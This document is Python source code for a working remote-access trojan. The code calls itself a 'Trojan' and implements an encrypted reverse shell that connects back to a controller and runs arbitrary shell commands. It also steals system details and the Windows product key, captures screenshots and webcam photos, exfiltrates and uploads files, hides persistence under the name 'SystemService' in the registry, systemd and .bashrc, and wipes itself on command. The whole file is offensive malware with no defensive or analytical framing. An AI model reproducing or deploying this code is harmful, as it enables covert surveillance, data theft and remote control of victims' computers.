import ctypes
import winreg as wrg
import socket
import subprocess
import os
import platform
import threading
import winreg
from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import base64
import json
import tempfile
import time
import sys
import locale
from datetime import datetime
import psutil
from PIL import ImageGrab
import cv2

HOST = '127.0.0.1'

class EncryptedReverseShell:
    def __init__(self):
        self.sock = None
        self.aes_key = None
        self.session_id = get_random_bytes(16)
        self.connected = False
        self.last_heartbeat = time.time()
        self.command_lock = threading.Lock()
        self.heartbeat_interval = 30 

    def get_port(self):
        return int(datetime.now().strftime("%d%m"))
        
    def get_system_encoding(self):
        try:
            if platform.system() == "Windows":
                kernel32 = ctypes.windll.kernel32
                codepage = kernel32.GetConsoleOutputCP()
                
                encoding_map = {
                    866: 'cp866',
                    1251: 'cp1251',
                    65001: 'utf-8',
                    437: 'cp437',
                }
                return encoding_map.get(codepage, 'cp866')
            else:
                return locale.getpreferredencoding() or 'utf-8'
        except:
            return 'utf-8'
    
    def generate_rsa_keys(self):
        key = RSA.generate(2048)
        return key, key.publickey()
    
    def aes_encrypt(self, data):
        if isinstance(data, str):
            data = data.encode('utf-8')
        elif isinstance(data, dict):
            data = json.dumps(data, ensure_ascii=False).encode('utf-8')
            
        cipher = AES.new(self.aes_key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return base64.b64encode(cipher.nonce + tag + ciphertext)
    
    def aes_decrypt(self, encrypted_data):
        try:
            encrypted_data = base64.b64decode(encrypted_data)
            nonce, tag, ciphertext = encrypted_data[:16], encrypted_data[16:32], encrypted_data[32:]
            
            cipher = AES.new(self.aes_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            
            try:
                return json.loads(decrypted.decode('utf-8'))
            except:
                return decrypted.decode('utf-8')
        except Exception as e:
            return {"error": f"Decryption failed: {str(e)}"}
    
    def rsa_encrypt(self, public_key, data):
        cipher = PKCS1_OAEP.new(public_key)
        return base64.b64encode(cipher.encrypt(data))
    
    def rsa_decrypt(self, private_key, encrypted_data):
        cipher = PKCS1_OAEP.new(private_key)
        return cipher.decrypt(base64.b64decode(encrypted_data))
    
    def key_exchange(self):
        private_key, public_key = self.generate_rsa_keys()
        
        public_key_bytes = public_key.export_key()
        self.sock.send(str(len(public_key_bytes)).encode().ljust(16) + public_key_bytes)
        
        key_size = int(self.sock.recv(16).strip())
        encrypted_aes_key = self.sock.recv(key_size)
        
        self.aes_key = self.rsa_decrypt(private_key, encrypted_aes_key)
        
        self.send_encrypted({"type": "session", "status": "established", "session_id": self.session_id.hex()})
    
    def send_encrypted(self, data):
        with self.command_lock:
            try:
                if not self.sock:
                    return False
                    
                encrypted = self.aes_encrypt(data)
                self.sock.send(str(len(encrypted)).encode().ljust(16) + encrypted)
                self.last_heartbeat = time.time()
                return True
            except Exception as e:
                print(f"[-] Send failed: {e}")
                return False
    
    def recv_encrypted(self, timeout=30):
        with self.command_lock:
            try:
                if not self.sock:
                    return None
                    
                self.sock.settimeout(timeout)
                size_data = self.sock.recv(16)
                if not size_data:
                    return None
                    
                size = int(size_data.strip())
                encrypted_data = b""
                while len(encrypted_data) < size:
                    chunk = self.sock.recv(size - len(encrypted_data))
                    if not chunk:
                        return None
                    encrypted_data += chunk
                    
                self.last_heartbeat = time.time()
                return self.aes_decrypt(encrypted_data)
            except socket.timeout:
                return {"type": "heartbeat"}
            except Exception as e:
                print(f"[-] Receive failed: {e}")
                return None

    def send_heartbeat(self):
        try:
            return self.send_encrypted({"type": "heartbeat", "timestamp": time.time()})
        except:
            return False
        
    def is_admin(self):
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        else:
            return False

    def get_product_key(self):
        key_path = r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform\\"
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        value_name = "BackupProductKeyDefault"
        try:
            value, value_type = winreg.QueryValueEx(key, value_name)
        except:
            if key:
                wrg.CloseKey(key)
            return 'Not Found'
        
        if key:
            wrg.CloseKey(key)

        return value

    def get_product_id(self):
        key_path = r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        value_name = "ProductID"
        try:
            value, value_type = winreg.QueryValueEx(key, value_name)
        except:
            if key:
                wrg.CloseKey(key)
            return 'Not Found'
        if key:
            wrg.CloseKey(key)
        return value
    
    def is_root(self):
        if os.getuid() == 0:
            return True
        else:
            return False

    def get_system_info(self):
        info = {
            "system": platform.system(),
            "node": platform.node(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "username": os.getenv('USERNAME') or os.getenv('USER'),
            "current_dir": os.getcwd(),
            "encoding": self.get_system_encoding(),
        }

        if platform.system() == 'Windows':
            info['is_admin'] = self.is_admin()
            info['product_id'] = self.get_product_id()
            info['product_key'] = self.get_product_key()
        else:
            info['is_root'] = self.is_root()
        
        try:
            info["cpu_cores"] = psutil.cpu_count()
            info["memory_total"] = round(psutil.virtual_memory().total / (1024**3), 2)
            info["memory_used"] = round(psutil.virtual_memory().used / (1024**3), 2)
            info["disk_usage"] = {}
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    info["disk_usage"][partition.device] = {
                        "total": round(usage.total / (1024**3), 2),
                        "used": round(usage.used / (1024**3), 2),
                        "free": round(usage.free / (1024**3), 2)
                    }
                except:
                    continue
        except Exception as e:
            info["psutil_error"] = str(e)
        
        return info

    def get_battery_info(self):
        try:
            if platform.system() != "Windows":
                return {"error": "Battery info is only available on Windows"}
            
            battery = psutil.sensors_battery()
            if battery is None:
                return {"error": "No battery found"}

            try:
                result = subprocess.run(['wmic', 'path', 'Win32_Battery', 'get', 'BatteryStatus,EstimatedChargeRemaining,EstimatedRunTime,Status,Name'], 
                                      capture_output=True, text=True, timeout=10)
                wmi_info = result.stdout.strip()
            except:
                wmi_info = "WMI info not available"
            
            battery_info = {
                "percent": battery.percent,
                "power_plugged": battery.power_plugged,
                "charging": battery.power_plugged,
                "status": "Charging" if battery.power_plugged else "Discharging",
                "seconds_left": battery.secsleft if battery.secsleft != -1 else "Unknown",
                "time_left": str(datetime.timedelta(seconds=battery.secsleft)) if battery.secsleft > 0 else "Unknown",
                "wmi_details": wmi_info
            }
            
            return {"battery_info": battery_info}
            
        except Exception as e:
            return {"error": f"Battery info failed: {str(e)}"}

    def reboot_system(self):
        try:
            system = platform.system()
            
            if system == "Windows":
                subprocess.run(['shutdown', '/r', '/t', '5', '/c', 'System reboot initiated'], 
                             capture_output=True)
                return {"output": "System will reboot in 5 seconds"}
                
            elif system == "Linux":
                try:
                    subprocess.run(['systemctl', 'reboot'], capture_output=True)
                except:
                    try:
                        subprocess.run(['reboot'], capture_output=True)
                    except:
                        subprocess.run(['sudo', 'reboot'], capture_output=True)
                
                return {"output": "Reboot command sent"}
            else:
                return {"error": f"Unsupported platform: {system}"}
                
        except Exception as e:
            return {"error": f"Reboot failed: {str(e)}"}

    def shutdown_system(self):
        try:
            system = platform.system()
            
            if system == "Windows":
                subprocess.run(['shutdown', '/s', '/t', '5', '/c', 'System shutdown initiated'], 
                             capture_output=True)
                return {"output": "System will shutdown in 5 seconds"}
                
            elif system == "Linux":
                try:
                    subprocess.run(['systemctl', 'poweroff'], capture_output=True)
                except:
                    try:
                        subprocess.run(['shutdown', '-h', 'now'], capture_output=True)
                    except:
                        subprocess.run(['sudo', 'shutdown', '-h', 'now'], capture_output=True)
                
                return {"output": "Shutdown command sent"}
            else:
                return {"error": f"Unsupported platform: {system}"}
                
        except Exception as e:
            return {"error": f"Shutdown failed: {str(e)}"}

    def take_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
                screenshot.save(tmp.name, 'PNG')
                with open(tmp.name, 'rb') as f:
                    screenshot_data = f.read()
            os.unlink(tmp.name)
            
            return {
                "screenshot": base64.b64encode(screenshot_data).decode('utf-8'),
                "size": len(screenshot_data)
            }
        except Exception as e:
            return {"error": f"Screenshot failed: {str(e)}"}

    def list_cameras(self):
        try:
            cameras = []
            for i in range(10):
                cap = cv2.VideoCapture(i)

                if cap.isOpened():
                    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
                    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
                    fps = cap.get(cv2.CAP_PROP_FPS)
                    
                    cameras.append({
                        "index": i,
                        "resolution": f"{width}x{height}",
                        "fps": round(fps, 1) if fps > 0 else "unknown",
                        "status": "available"
                    })
                    cap.release()
            
            if not cameras:
                return {"error": "No cameras found"}
            
            return {"cameras": cameras}
        except Exception as e:
            return {"error": f"Camera list failed: {str(e)}"}

    def take_camera_photo(self, camera_index=0):
        try:
            camera = cv2.VideoCapture(camera_index)
            if not camera.isOpened():
                return {"error": f"Camera {camera_index} not available"}
            
            time.sleep(1)
            ret, frame = camera.read()

            width = int(camera.get(cv2.CAP_PROP_FRAME_WIDTH))
            height = int(camera.get(cv2.CAP_PROP_FRAME_HEIGHT))
            
            camera.release()
            
            if not ret:
                return {"error": "Failed to capture image"}
            
            ret, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
            if not ret:
                return {"error": "Failed to encode image"}
            
            photo_data = base64.b64encode(buffer).decode('utf-8')
            return {
                "camera_photo": photo_data,
                "size": len(photo_data),
                "camera_index": camera_index,
                "resolution": f"{width}x{height}"
            }
        except Exception as e:
            return {"error": f"Camera capture failed: {str(e)}"}

    def list_processes(self):
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_info', 'cpu_percent']):
                try:
                    processes.append({
                        "pid": proc.info['pid'],
                        "name": proc.info['name'],
                        "user": proc.info['username'],
                        "memory_mb": round(proc.info['memory_info'].rss / (1024**2), 1),
                        "cpu": round(proc.info['cpu_percent'], 1)
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return {"processes": processes[:50]}
        except Exception as e:
            return {"error": f"Process list failed: {str(e)}"}

    def get_network_info(self):
        try:
            network_info = {
                "connections": [],
                "interfaces": {}
            }

            for interface, addrs in psutil.net_if_addrs().items():
                network_info["interfaces"][interface] = []
                for addr in addrs:
                    network_info["interfaces"][interface].append({
                        "family": str(addr.family),
                        "address": addr.address,
                        "netmask": addr.netmask
                    })

            for conn in psutil.net_connections(kind='inet'):
                if conn.laddr and conn.status == 'ESTABLISHED':
                    network_info["connections"].append({
                        "local_address": f"{conn.laddr.ip}:{conn.laddr.port}",
                        "status": conn.status,
                        "pid": conn.pid
                    })
            
            return network_info
        except Exception as e:
            return {"error": f"Network info failed: {str(e)}"}

    def download_file(self, file_path):
        try:
            if not os.path.exists(file_path):
                return {"error": "File not found"}
            
            if not os.path.isfile(file_path):
                return {"error": "Path is not a file"}
            
            file_size = os.path.getsize(file_path)
            if file_size > 50 * 1024 * 1024:
                return {"error": "File too large (max 50MB)"}
            
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            return {
                "file_data": base64.b64encode(file_data).decode('utf-8'),
                "file_name": os.path.basename(file_path),
                "file_size": len(file_data)
            }
        except Exception as e:
            return {"error": f"File read failed: {str(e)}"}

    def upload_file(self, file_data, file_name, target_path=None):
        try:
            file_bytes = base64.b64decode(file_data)
            
            if target_path:
                save_path = target_path
            else:
                save_path = os.path.join(os.getcwd(), file_name)
            
            save_dir = os.path.dirname(save_path)
            if save_dir and not os.path.exists(save_dir):
                os.makedirs(save_dir, exist_ok=True)
            
            with open(save_path, 'wb') as f:
                f.write(file_bytes)
            
            if os.path.exists(save_path):
                file_size = os.path.getsize(save_path)
                return {
                    "success": True,
                    "message": f"File uploaded successfully to {save_path}",
                    "file_size": file_size,
                    "saved_path": save_path
                }
            else:
                return {"error": "File upload failed - file not created"}
                
        except Exception as e:
            return {"error": f"File upload failed: {str(e)}"}
        
    def gutmann_patterns(self):
        patterns = []
    
        for _ in range(4):
            patterns.append([os.urandom(1) for _ in range(256)])
    
        patterns.append([b'\x55'] * 256)
        patterns.append([b'\xAA'] * 256)
        patterns.append([b'\x92\x49\x24'] * 85 + [b'\x92'])
        patterns.append([b'\x49\x24\x92'] * 85 + [b'\x49'])
        patterns.append([b'\x24\x92\x49'] * 85 + [b'\x24'])
    
        for _ in range(4):
            patterns.append([os.urandom(1) for _ in range(256)])
    
        return patterns
    
    def kill(self, file_path):
        if not os.path.exists(file_path):
            return False
    
        file_size = os.path.getsize(file_path)
        patterns = self.gutmann_patterns()
    
        for i, pattern in enumerate(patterns):
            data = b''.join(pattern * (file_size // 256 + 1))[:file_size]
            
            with open(file_path, 'wb') as f:
                f.write(data)
    
        os.remove(file_path)
        return True

    def execute_kill_switch(self):
        try:
            print("[+] Kill switch activated - self-destructing...")
            
            self.remove_from_startup()
            
            if getattr(sys, 'frozen', False):
                current_file = sys.executable
            else:
                current_file = os.path.abspath(__file__)
            
            if self.sock:
                try:
                    self.sock.close()
                except:
                    pass
            
            if os.path.exists(current_file):
                try:
                    self.kill(current_file)
                    
                    time.sleep(2)
                    os._exit(0)
                except Exception as e:
                    print(f"[-] File deletion failed: {e}")
            
        except Exception as e:
            print(f"[-] Kill switch failed: {e}")
            try:
                sys.exit(1)
            except:
                os._exit(1)

    def add_to_startup(self, name="SystemService"):
        try:
            if getattr(sys, 'frozen', False):
                executable_path = sys.executable
            else:
                executable_path = f'"{sys.executable}" "{os.path.abspath(__file__)}"'

            system = platform.system()

            if system == "Windows":
                if not self.is_admin():
                    return {"error": "Administrator privileges required for startup registration"}
                
                user_startup = False
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                        r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                        0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, executable_path)
                    winreg.CloseKey(key)
                    user_startup = True
                except Exception as e:
                    return {"error": f"User startup registration failed: {str(e)}"}

                system_startup = False
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
                                        0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, executable_path)
                    winreg.CloseKey(key)
                    system_startup = True
                except:
                    pass
                
                return {
                    "success": True,
                    "message": f"Added to startup as '{name}'",
                    "user_startup": user_startup,
                    "system_startup": system_startup,
                    "platform": "Windows"
                }

            elif system == "Linux":
                home_dir = os.path.expanduser("~")
                service_dir = os.path.join(home_dir, ".config", "systemd", "user")
                service_file = os.path.join(service_dir, f"{name}.service")
                
                try:
                    if not os.path.exists(service_dir):
                        os.makedirs(service_dir)
                except Exception as e:
                    return {"error": f"Cannot create service directory: {str(e)}"}

                if getattr(sys, 'frozen', False):
                    exec_cmd = executable_path
                else:
                    exec_cmd = f"{sys.executable} {os.path.abspath(__file__)}"

                service_content = f"""[Unit]
Description={name} Service
After=network.target

[Service]
ExecStart={exec_cmd}
Restart=always
RestartSec=10
WorkingDirectory={os.path.dirname(os.path.abspath(__file__)) if not getattr(sys, 'frozen', False) else '/'}

[Install]
WantedBy=default.target
"""
                systemd_enabled = False
                try:
                    with open(service_file, 'w') as f:
                        f.write(service_content)
                    
                    subprocess.run(['systemctl', '--user', 'daemon-reload'], capture_output=True)
                    subprocess.run(['systemctl', '--user', 'enable', f'{name}.service'], capture_output=True)
                    subprocess.run(['systemctl', '--user', 'start', f'{name}.service'], capture_output=True)
                    
                    check_result = subprocess.run(['systemctl', '--user', 'is-active', f'{name}.service'], 
                                                capture_output=True, text=True)
                    systemd_enabled = (check_result.stdout.strip() == 'active')
                except:
                    systemd_enabled = False

                bashrc_enabled = False
                try:
                    bashrc_path = os.path.join(home_dir, ".bashrc")
                    startup_line = f'\n# {name}\n(cd /tmp; nohup {exec_cmd} > /dev/null 2>&1 &)\n'
                    
                    if os.path.exists(bashrc_path):
                        with open(bashrc_path, 'r') as f:
                            content = f.read()
                        if f"# {name}" not in content:
                            with open(bashrc_path, 'a') as f:
                                f.write(startup_line)
                        bashrc_enabled = True
                    else:
                        with open(bashrc_path, 'w') as f:
                            f.write(startup_line)
                        bashrc_enabled = True
                except:
                    bashrc_enabled = False

                message = f"Added to startup as '{name}'"
                if systemd_enabled:
                    message += " (systemd active)"
                elif os.path.exists(service_file):
                    message += " (systemd installed but inactive)"
                if bashrc_enabled:
                    message += " (.bashrc)"
                
                return {
                    "success": systemd_enabled or bashrc_enabled,
                    "message": message,
                    "systemd_enabled": systemd_enabled,
                    "bashrc_enabled": bashrc_enabled,
                    "platform": "Linux"
                }
            else:
                return {"error": f"Unsupported platform: {system}"}

        except Exception as e:
            return {"error": f"Startup registration failed: {str(e)}"}
    
    def remove_from_startup(self, name="SystemService"):
        try:
            system = platform.system()
            
            if system == "Windows":
                removed = []
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                        r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                        0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(key, name)
                    winreg.CloseKey(key)
                    removed.append("HKEY_CURRENT_USER")
                except:
                    pass

                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
                                        0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(key, name)
                    winreg.CloseKey(key)
                    removed.append("HKEY_LOCAL_MACHINE")
                except:
                    pass
                
                if removed:
                    return {"success": True, "message": f"Removed from startup: {', '.join(removed)}"}
                else:
                    return {"message": "Not found in startup"}

            elif system == "Linux":
                home_dir = os.path.expanduser("~")
                service_file = os.path.join(home_dir, ".config", "systemd", "user", f"{name}.service")
                results = []
                
                try:
                    subprocess.run(['systemctl', '--user', 'stop', f'{name}.service'], capture_output=True)
                    subprocess.run(['systemctl', '--user', 'disable', f'{name}.service'], capture_output=True)
                    
                    if os.path.exists(service_file):
                        os.remove(service_file)
                        subprocess.run(['systemctl', '--user', 'daemon-reload'], capture_output=True)
                        results.append("systemd service removed")
                    else:
                        results.append("systemd service not found")
                except:
                    results.append("systemd removal attempted")
                
                try:
                    bashrc_path = os.path.join(home_dir, ".bashrc")
                    if os.path.exists(bashrc_path):
                        with open(bashrc_path, 'r') as f:
                            lines = f.readlines()
                        marker = f"# {name}"
                        new_lines = []
                        skip = False
                        for line in lines:
                            if marker in line:
                                skip = True
                            elif skip:
                                if line.strip().startswith('(') or line.strip().startswith('nohup'):
                                    skip = False
                                    continue
                                skip = False
                            if not skip:
                                new_lines.append(line)
                        
                        if len(new_lines) < len(lines):
                            with open(bashrc_path, 'w') as f:
                                f.writelines(new_lines)
                            results.append(".bashrc cleaned")
                        else:
                            results.append(".bashrc entry not found")
                    else:
                        results.append(".bashrc not found")
                except:
                    results.append(".bashrc removal attempted")
                
                return {"success": True, "message": f"Removed from startup: {'; '.join(results)}"}
            else:
                return {"error": f"Unsupported platform: {system}"}
                
        except Exception as e:
            return {"error": f"Startup removal failed: {str(e)}"}
    
    def check_startup_status(self, name="SystemService"):
        try:
            system = platform.system()
            status = {}

            if system == "Windows":
                status["HKEY_CURRENT_USER"] = False
                status["HKEY_LOCAL_MACHINE"] = False
                
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                        r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                        0, winreg.KEY_READ)
                    try:
                        value, _ = winreg.QueryValueEx(key, name)
                        status["HKEY_CURRENT_USER"] = True
                    except:
                        pass
                    winreg.CloseKey(key)
                except:
                    pass
                
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
                                        0, winreg.KEY_READ)
                    try:
                        value, _ = winreg.QueryValueEx(key, name)
                        status["HKEY_LOCAL_MACHINE"] = True
                    except:
                        pass
                    winreg.CloseKey(key)
                except:
                    pass

            elif system == "Linux":
                home_dir = os.path.expanduser("~")
                status["systemd_service"] = False
                status["bashrc_entry"] = False
                
                service_file = os.path.join(home_dir, ".config", "systemd", "user", f"{name}.service")
                if os.path.exists(service_file):
                    result = subprocess.run(['systemctl', '--user', 'is-active', f'{name}.service'], 
                                          capture_output=True, text=True)
                    status["systemd_service"] = (result.stdout.strip() == 'active')
                else:
                    status["systemd_service"] = False
                
                bashrc_path = os.path.join(home_dir, ".bashrc")
                if os.path.exists(bashrc_path):
                    with open(bashrc_path, 'r') as f:
                        content = f.read()
                    status["bashrc_entry"] = f"# {name}" in content
                else:
                    status["bashrc_entry"] = False
            
            return {"startup_status": status, "platform": system}
            
        except Exception as e:
            return {"error": f"Startup check failed: {str(e)}"}

    def execute_command(self, command_data):
        try:
            if isinstance(command_data, str):
                command = command_data
                cmd_type = "shell"
            else:
                cmd_type = command_data.get("type", "shell")
                command = command_data.get("command", "")
                upload_data = command_data.get("upload_data")
                target_path = command_data.get("target_path")
                file_name = command_data.get("file_name")
                camera_index = command_data.get("camera_index", 0)
                startup_name = command_data.get("startup_name", "SystemService")
            
            if cmd_type == "shell":
                if command.startswith('cd '):
                    path = command[3:].strip()
                    try:
                        os.chdir(path)
                        return {"output": f"Changed directory to {os.getcwd()}"}
                    except Exception as e:
                        return {"error": f"cd failed: {str(e)}"}
                
                try:
                    system_encoding = self.get_system_encoding()
                    
                    result = subprocess.run(
                        command, 
                        shell=True, 
                        capture_output=True, 
                        timeout=30
                    )

                    stdout = result.stdout.decode(system_encoding, errors='replace')
                    stderr = result.stderr.decode(system_encoding, errors='replace')
                    
                    output = stdout
                    if stderr:
                        output += f"\nERROR: {stderr}"
                        
                    return {"output": output if output else "", "encoding": system_encoding}
                    
                except subprocess.TimeoutExpired:
                    return {"error": "Command timed out"}
                except Exception as e:
                    return {"error": f"Command execution failed: {str(e)}"}
            
            elif cmd_type == "info":
                return {"system_info": self.get_system_info()}
            
            elif cmd_type == "screenshot":
                return {"screenshot_result": self.take_screenshot()}
            
            elif cmd_type == "list_cam":
                return {"camera_list": self.list_cameras()}
            
            elif cmd_type == "cam":
                return {"camera_result": self.take_camera_photo(camera_index)}
            
            elif cmd_type == "processes":
                return {"process_list": self.list_processes()}
            
            elif cmd_type == "network":
                return {"network_info": self.get_network_info()}
            
            elif cmd_type == "download":
                return {"download_result": self.download_file(command)}
            
            elif cmd_type == "battery":
                return {"battery_result": self.get_battery_info()}
            
            elif cmd_type == "reboot":
                return {"reboot_result": self.reboot_system()}
            
            elif cmd_type == "shutdown":
                return {"shutdown_result": self.shutdown_system()}
            
            elif cmd_type == "kill_switch":
                def delayed_destruction():
                    time.sleep(1)
                    self.execute_kill_switch()
                
                destruction_thread = threading.Thread(target=delayed_destruction, daemon=True)
                destruction_thread.start()
                
                return {"killed": "OK! Trojan destroyed and connection terminated."}
            
            elif cmd_type == "upload":
                if upload_data and file_name:
                    return {"upload_result": self.upload_file(upload_data, file_name, target_path)}
                else:
                    return {"error": "Missing upload data or filename"}
            
            elif cmd_type == "add_to_startup":
                return {"startup_result": self.add_to_startup(startup_name)}
            
            elif cmd_type == "remove_from_startup":
                return {"startup_result": self.remove_from_startup(startup_name)}
            
            elif cmd_type == "check_startup":
                return {"startup_status": self.check_startup_status(startup_name)}
            
            elif cmd_type == "heartbeat":
                return {"type": "heartbeat", "status": "alive"}
            
            else:
                return {"error": f"Unknown command type: {cmd_type}"}
            
        except Exception as e:
            return {"error": f"Execution failed: {str(e)}"}
    
    def start_shell(self):
        print("[+] Shell started, waiting for commands...")
        self.connected = True
        last_heartbeat_sent = time.time()
        
        while self.connected:
            try:
                command_data = self.recv_encrypted(timeout=30)
                
                if command_data is None:
                    print("[-] Connection lost")
                    break
                
                if isinstance(command_data, dict) and command_data.get("type") == "heartbeat":
                    if time.time() - last_heartbeat_sent > self.heartbeat_interval:
                        self.send_encrypted({"type": "heartbeat", "status": "alive"})
                        last_heartbeat_sent = time.time()
                    continue
                
                if time.time() - self.last_heartbeat > 300:
                    print("[-] Connection timeout")
                    break
                
                if isinstance(command_data, str) and command_data in ["exit", "quit"]:
                    self.send_encrypted({"type": "status", "message": "Session terminated"})
                    break
                
                result = self.execute_command(command_data)
                if not self.send_encrypted(result):
                    print("[-] Failed to send response")
                    break
                
                last_heartbeat_sent = time.time() if isinstance(result, dict) and result.get("type") == "heartbeat" else last_heartbeat_sent
                    
            except socket.timeout:
                if time.time() - last_heartbeat_sent > self.heartbeat_interval:
                    if not self.send_heartbeat():
                        print("[-] Heartbeat failed, connection lost")
                        break
                    last_heartbeat_sent = time.time()
                continue
            except Exception as e:
                print(f"[-] Error in shell: {e}")
                try:
                    self.send_encrypted({"error": f"Shell error: {str(e)}"})
                except:
                    break
                continue
        
        self.connected = False
    
    def connect(self):
        max_retries = 5
        retry_delay = 10
        
        while True:
            for attempt in range(max_retries):
                try:
                    print(f"[+] Attempting connection to {HOST}:{self.get_port()} (attempt {attempt + 1}/{max_retries})")
                    
                    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.sock.settimeout(30)
                    self.sock.connect((HOST, self.get_port()))
                    
                    print("[+] Connected, performing key exchange...")
                    
                    self.key_exchange()
                    
                    print("[+] Key exchange completed, starting shell...")

                    self.start_shell()
                    
                    print("[-] Shell session ended, reconnecting...")
                    break
                    
                except Exception as e:
                    print(f"[-] Connection failed: {e}")
                    if self.sock:
                        self.sock.close()
                        self.sock = None
                    
                    if attempt < max_retries - 1:
                        print(f"[+] Retrying in {retry_delay} seconds...")
                        time.sleep(retry_delay)
                    else:
                        print(f"[-] Max retries exceeded, waiting {retry_delay * 2} seconds before new cycle...")
                        time.sleep(retry_delay * 2)
                        break
            
            print(f"[+] Starting new connection cycle in {retry_delay * 3} seconds...")
            time.sleep(retry_delay * 3)

if __name__ == "__main__":
    shell = EncryptedReverseShell()
    shell.connect()